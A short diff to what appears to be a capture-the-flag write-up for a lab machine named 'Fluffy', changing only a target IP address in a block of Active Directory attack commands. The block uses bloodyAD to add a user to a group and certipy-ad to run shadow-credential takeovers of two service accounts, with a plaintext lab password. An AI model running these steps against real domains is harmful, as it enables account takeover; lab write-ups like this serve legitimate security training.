@@ -121,7 +121,7 @@ alternate authentication key — without needing to know or reset the
 account's real password:
 
 ```bash
-bloodyAD -d fluffy.htb -u p.agila -p prometheusx-303 --host 10.10.11.69 add groupMember 'service accounts' p.agila
+bloodyAD -d fluffy.htb -u p.agila -p prometheusx-303 --host 10.129.232.88 add groupMember 'service accounts' p.agila
 certipy-ad shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc
 certipy-ad shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account ca_svc
 ```
